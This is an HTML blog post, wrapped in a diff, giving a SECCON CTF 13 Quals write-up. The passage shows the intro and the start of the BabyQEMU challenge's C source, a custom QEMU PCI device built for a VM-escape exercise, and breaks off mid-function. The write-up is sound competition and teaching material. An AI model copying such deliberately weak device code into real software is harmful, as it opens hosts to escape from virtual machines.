@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>SECCON CTF 13 Quals - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:url" content="https://chovid99.github.io/posts/seccon-ctf-13-quals/">
+  <meta property="og:site_name" content="Chovid99&#39;s Blog">
+  <meta property="og:title" content="SECCON CTF 13 Quals">
+  <meta property="og:description" content="Writeup for SECCON CTF 13 Quals">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-24T19:59:02+07:00">
+    <meta property="article:modified_time" content="2024-11-25T00:04:47+07:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Qemu">
+    <meta property="article:tag" content="Blockchain">
+    <meta property="article:tag" content="Evm">
+    <meta property="article:tag" content="2024">
+    <meta property="og:image" content="https://chovid99.github.io/C99-web-card.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png">
+  <meta name="twitter:title" content="SECCON CTF 13 Quals">
+  <meta name="twitter:description" content="Writeup for SECCON CTF 13 Quals">
+      <meta name="twitter:site" content="@Chovid99">
+<meta name="application-name" content="Chovid99&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/seccon-ctf-13-quals/" /><link rel="prev" href="https://chovid99.github.io/posts/kalmarctf-2024/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "SECCON CTF 13 Quals",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/chovid99.github.io\/posts\/seccon-ctf-13-quals\/"
+        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, pwn, qemu, blockchain, evm, 2024","wordcount":  2465 ,
+        "url": "https:\/\/chovid99.github.io\/posts\/seccon-ctf-13-quals\/","datePublished": "2024-11-24T19:59:02+07:00","dateModified": "2024-11-25T00:04:47+07:00","publisher": {
+            "@type": "Organization",
+            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                
+                
+            </a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SECCON CTF 13 Quals</h1><div class="post-meta">
+            <div class="post-meta-line">
+                </div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Nov 24, 2024">Nov 24, 2024</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2465 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;12 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#babyqemu">BabyQEMU</a>
+          <ul>
+            <li><a href="#initial-analysis">Initial Analysis</a></li>
+            <li><a href="#solution">Solution</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#blockchain">Blockchain</a>
+      <ul>
+        <li><a href="#trillion-ether">Trillion Ether</a>
+          <ul>
+            <li><a href="#initial-analysis-1">Initial Analysis</a></li>
+            <li><a href="#solution-1">Solution</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#social-media">Social Media</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/fvhYwU8.png" title="https://i.imgur.com/fvhYwU8.png" data-thumbnail="https://i.imgur.com/fvhYwU8.png" data-sub-html="<h2>SECCON CTF 13 Quals. We qualified to the finals.</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://i.imgur.com/fvhYwU8.png"
+            data-srcset="https://i.imgur.com/fvhYwU8.png, https://i.imgur.com/fvhYwU8.png 1.5x, https://i.imgur.com/fvhYwU8.png 2x"
+            data-sizes="auto"
+            alt="https://i.imgur.com/fvhYwU8.png" />
+    </a><figcaption class="image-caption">SECCON CTF 13 Quals. We qualified to the finals.</figcaption>
+    </figure>
+<p>I played with the <strong>ADA INDONESIA COY</strong> team in the SECCON CTF 13 Quals. We managed to secure <strong>fifth place</strong> and qualify for the finals next March 2025. A huge shoutout and thanks to my awesome teammates for their fantastic teamwork!</p>
+<p>Below is the writeup for the challenges that I managed to solve.</p>
+<h1 id="pwn">Pwn</h1>
+<h2 id="babyqemu">BabyQEMU</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">nc babyqemu.seccon.games 3824</div>
+        </div>
+    </div>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>In this challenge, we were provided with a <code>zip</code> file containing a new driver which is added to the given QEMU. Let&rsquo;s take a look on it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;qemu/osdep.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;hw/pci/pci_device.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;hw/qdev-properties.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;qemu/module.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;sysemu/kvm.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;qom/object.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;qapi/error.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;hw/char/baby.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">PCIBabyDevState</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PCIDevice</span> <span class="n">parent_obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">MemoryRegion</span> <span class="n">mmio</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">PCIBabyDevReg</span> <span class="o">*</span><span class="n">reg_mmio</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">OBJECT_DECLARE_SIMPLE_TYPE</span><span class="p">(</span><span class="n">PCIBabyDevState</span><span class="p">,</span> <span class="n">PCI_BABY_DEV</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">pci_babydev_mmio_read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">pci_babydev_mmio_write</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">const</span> <span class="n">MemoryRegionOps</span> <span class="n">pci_babydev_mmio_ops</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">read</span>       <span class="o">=</span> <span class="n">pci_babydev_mmio_read</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">write</span>      <span class="o">=</span> <span class="n">pci_babydev_mmio_write</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">endianness</span> <span class="o">=</span> <span class="n">DEVICE_LITTLE_ENDIAN</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">impl</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">min_access_size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">max_access_size</span> <span class="o">=</span> <span class="mi">4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">pci_babydev_realize</span><span class="p">(</span><span class="n">PCIDevice</span> <span class="o">*</span><span class="n">pci_dev</span><span class="p">,</span> <span class="n">Error</span> <span class="o">**</span><span class="n">errp</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PCIBabyDevState</span> <span class="o">*</span><span class="n">ms</span> <span class="o">=</span> <span class="nf">PCI_BABY_DEV</span><span class="p">(</span><span class="n">pci_dev</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">pci_conf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">debug_printf</span><span class="p">(</span><span class="s">&#34;called</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pci_conf</span> <span class="o">=</span> <span class="n">pci_dev</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pci_conf</span><span class="p">[</span><span class="n">PCI_INTERRUPT_PIN</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ms</span><span class="o">-&gt;</span><span class="n">reg_mmio</span> <span class="o">=</span> <span class="nf">g_malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">PCIBabyDevReg</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">memory_region_init_io</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">mmio</span><span class="p">,</span> <span class="nf">OBJECT</span><span class="p">(</span><span class="n">ms</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">pci_babydev_mmio_ops</span><span class="p">,</span> <span class="n">ms</span><span class="p">,</span> <span class="n">TYPE_PCI_BABY_DEV</span><span class="s">&#34;-mmio&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">PCIBabyDevReg</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pci_register_bar</span><span class="p">(</span><span class="n">pci_dev</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PCI_BASE_ADDRESS_SPACE_MEMORY</span> <span class="o">|</span> <span class="n">PCI_BASE_ADDRESS_MEM_TYPE_64</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">mmio</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">pci_babydev_reset</span><span class="p">(</span><span class="n">PCIBabyDevState</span> <span class="o">*</span><span class="n">ms</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">debug_printf</span><span class="p">(</span><span class="s">&#34;called</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">bzero</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">reg_mmio</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">PCIBabyDevReg</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">bzero</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">pci_babydev_uninit</span><span class="p">(</span><span class="n">PCIDevice</span> <span class="o">*</span><span class="n">pci_dev</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PCIBabyDevState</span> <span class="o">*</span><span class="n">ms</span> <span class="o">=</span> <span class="nf">PCI_BABY_DEV</span><span class="p">(</span><span class="n">pci_dev</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">pci_babydev_reset</span><span class="p">(</span><span class="n">ms</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">g_free</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">reg_mmio</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">qdev_pci_babydev_reset</span><span class="p">(</span><span class="n">DeviceState</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PCIBabyDevState</span> <span class="o">*</span><span class="n">ms</span> <span class="o">=</span> <span class="nf">PCI_BABY_DEV</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">pci_babydev_reset</span><span class="p">(</span><span class="n">ms</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">Property</span> <span class="n">pci_babydev_properties</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DEFINE_PROP_END_OF_LIST</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">pci_babydev_class_init</span><span class="p">(</span><span class="n">ObjectClass</span> <span class="o">*</span><span class="n">klass</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DeviceClass</span> <span class="o">*</span><span class="n">dc</span> <span class="o">=</span> <span class="nf">DEVICE_CLASS</span><span class="p">(</span><span class="n">klass</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PCIDeviceClass</span> <span class="o">*</span><span class="n">k</span> <span class="o">=</span> <span class="nf">PCI_DEVICE_CLASS</span><span class="p">(</span><span class="n">klass</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">k</span><span class="o">-&gt;</span><span class="n">realize</span> <span class="o">=</span> <span class="n">pci_babydev_realize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">k</span><span class="o">-&gt;</span><span class="n">exit</span> <span class="o">=</span> <span class="n">pci_babydev_uninit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">k</span><span class="o">-&gt;</span><span class="n">vendor_id</span> <span class="o">=</span> <span class="n">BABY_PCI_VENDOR_ID</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">k</span><span class="o">-&gt;</span><span class="n">device_id</span> <span class="o">=</span> <span class="n">BABY_PCI_DEVICE_ID</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">k</span><span class="o">-&gt;</span><span class="n">revision</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">k</span><span class="o">-&gt;</span><span class="n">class_id</span> <span class="o">=</span> <span class="n">PCI_CLASS_OTHERS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dc</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="s">&#34;SECCON CTF 2024 Challenge : Baby QEMU Escape Device&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">set_bit</span><span class="p">(</span><span class="n">DEVICE_CATEGORY_MISC</span><span class="p">,</span> <span class="n">dc</span><span class="o">-&gt;</span><span class="n">categories</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dc</span><span class="o">-&gt;</span><span class="n">reset</span> <span class="o">=</span> <span class="n">qdev_pci_babydev_reset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">device_class_set_props</span><span class="p">(</span><span class="n">dc</span><span class="p">,</span> <span class="n">pci_babydev_properties</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">const</span> <span class="n">TypeInfo</span> <span class="n">pci_babydev_info</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">name</span>          <span class="o">=</span> <span class="n">TYPE_PCI_BABY_DEV</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">parent</span>        <span class="o">=</span> <span class="n">TYPE_PCI_DEVICE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">instance_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PCIBabyDevState</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">class_init</span>    <span class="o">=</span> <span class="n">pci_babydev_class_init</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">interfaces</span> <span class="o">=</span> <span class="p">(</span><span class="n">InterfaceInfo</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span> <span class="n">INTERFACE_CONVENTIONAL_PCI_DEVICE</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">pci_babydev_register_types</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">type_register_static</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pci_babydev_info</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">type_init</span><span class="p">(</span><span class="n">pci_babydev_register_types</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">pci_babydev_mmio_read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PCIBabyDevState</span> <span class="o">*</span><span class="n">ms</span> <span class="o">=</span> <span class="n">opaque</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">PCIBabyDevReg</span> <span class="o">*</span><span class="n">reg</span> <span class="o">=</span> <span class="n">ms</span><span class="o">-&gt;</span><span class="n">reg_mmio</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">debug_printf</span><span class="p">(</span><span class="s">&#34;addr:%lx, size:%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span><span class="p">(</span><span class="n">addr</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">MMIO_GET_DATA</span><span class="p">:</span>
